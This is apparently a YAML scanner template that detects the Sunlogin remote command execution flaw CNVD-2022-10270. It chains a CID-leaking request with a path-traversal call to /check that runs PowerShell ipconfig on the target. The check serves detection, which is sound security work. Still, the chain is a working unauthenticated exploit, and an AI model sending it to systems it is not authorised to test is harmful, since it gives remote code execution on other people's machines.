expression: r0() && r1()
id: CNVD-2022-10270
info:
  author: zan8in
  description: "\u5411\u65E5\u8475\u901A\u8FC7\u53D1\u9001\u7279\u5B9A\u7684\u8BF7\
    \u6C42\u83B7\u53D6CID\u540E\uFF0C\u53EF\u8C03\u7528 check\u63A5\u53E3\u5B9E\u73B0\
    \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\uFF0C\u5BFC\u81F4\u670D\u52A1\u5668\u6743\
    \u9650\u88AB\u83B7\u53D6\nbody=\"Verification failure\"\n"
  name: "\u5411\u65E5\u8475 check \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/serverapp/%E5%90%91%E6%97%A5%E8%91%B5/%E5%90%91%E6%97%A5%E8%91%B5%20check%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2022-10270.html
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"verify_string"')
    output:
      cid: search["cid"]
      search: '"\"verify_string\":\"(?P<cid>.+?)\"".bsubmatch(response.body)'
    request:
      method: GET
      path: /cgi-bin/rpc?action=verify-haras
  r1:
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
    request:
      headers:
        Cookie: CID={{cid}}
      method: GET
      path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
